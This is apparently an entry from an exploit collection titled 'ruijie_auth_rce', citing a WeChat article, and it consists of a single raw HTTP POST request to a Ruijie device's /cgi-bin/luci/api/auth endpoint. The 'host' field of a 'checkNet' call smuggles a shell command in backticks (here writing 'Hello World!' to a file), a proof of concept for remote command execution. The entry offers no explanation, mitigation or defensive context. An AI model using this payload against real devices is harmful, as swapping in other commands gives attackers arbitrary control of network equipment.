# ruijie_auth_rce

from： https://mp.weixin.qq.com/s/TFxN7wCWsWOMTECxhgIsJw
2024.3.11 @2

```
POST /cgi-bin/luci/api/auth HTTP/1.1
Host: 127.0.0.1
Content-Type: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15

{"method":"checkNet","params":{"host":"`echo Hello World!>test.txt`"}}
```
